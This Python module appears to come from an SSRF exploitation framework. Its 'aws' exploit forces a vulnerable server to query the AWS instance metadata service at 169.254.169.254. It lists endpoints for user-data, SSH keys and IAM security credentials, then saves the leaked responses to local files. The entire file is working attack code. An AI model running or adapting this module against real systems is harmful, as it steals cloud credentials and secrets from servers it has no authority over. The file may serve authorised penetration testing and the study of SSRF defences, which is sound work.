from core.utils import *
import logging
import os

name          = "aws"
description   = "Access sensitive data from AWS"
author        = "Swissky"
documentation = [
    "https://hackerone.com/reports/53088",
    "https://hackerone.com/reports/285380",
    "https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/"
]

class exploit():
    endpoints = set()

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            # Create directory to store files
            directory = requester.host
            if not os.path.exists(directory):
                os.makedirs(directory)

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0] , "80")
                r  = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info("\033[32mReading file\033[0m : {}".format(payload))
                    print(diff)

                    # Write diff to a file
                    filename = endpoint[1].split('/')[-1]
                    if filename == "":
                        filename = endpoint[1].split('/')[-2:-1][0]

                    logging.info("\033[32mWriting file\033[0m : {} to {}".format(payload, directory + "/" + filename))
                    with open(directory + "/" + filename, 'w') as f:
                        f.write(diff)


    def add_endpoints(self):
        self.endpoints.add( ("169.254.169.254","latest/user-data") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/ami-id") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/reservation-id") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/hostname") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/0/openssh-key") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/1/openssh-key") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/2/openssh-key") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/iam/security-credentials/dummy") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/iam/security-credentials/ecsInstanceRole") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/iam/security-credentials/") )
        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/") )
        self.endpoints.add( ("169.254.169.254","latest/user-data/") )
